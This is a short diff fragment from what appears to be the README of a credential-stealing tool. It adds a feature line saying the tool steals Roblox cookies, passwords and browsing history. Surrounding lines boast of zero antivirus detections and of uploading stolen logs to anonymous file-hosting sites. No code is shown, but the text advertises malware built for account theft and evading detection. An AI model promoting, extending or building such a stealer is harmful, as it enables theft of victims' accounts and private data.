@@ -4,6 +4,9 @@
 0 Detections on antivirus.
 
 ✨・Features
+
+🍪 Steals Roblox cookies, Passwords, and History
+
 📁 - 4 Supported Files Upload Websites (Catbox.moe, gofile.io, anonymfile.com, file.io)
 
 🗂️ - Logs (Everything in 1 zip file)
